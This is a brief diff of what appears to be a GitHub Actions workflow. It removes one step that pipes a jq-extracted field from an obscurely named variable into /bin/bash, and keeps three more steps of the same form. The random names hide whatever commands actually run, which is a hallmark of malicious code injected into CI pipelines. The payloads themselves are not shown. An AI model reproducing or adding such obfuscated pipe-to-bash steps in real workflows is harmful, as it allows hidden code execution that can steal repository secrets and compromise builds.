@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$vv480" | jq -r .edtk044 | /bin/bash
           echo $fzy2 | jq -r .mlts90 | /bin/bash
           echo $zur78 | jq -r .av7 | /bin/bash
-          printf '%s' "$mipn05" | jq -r .evebm4 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
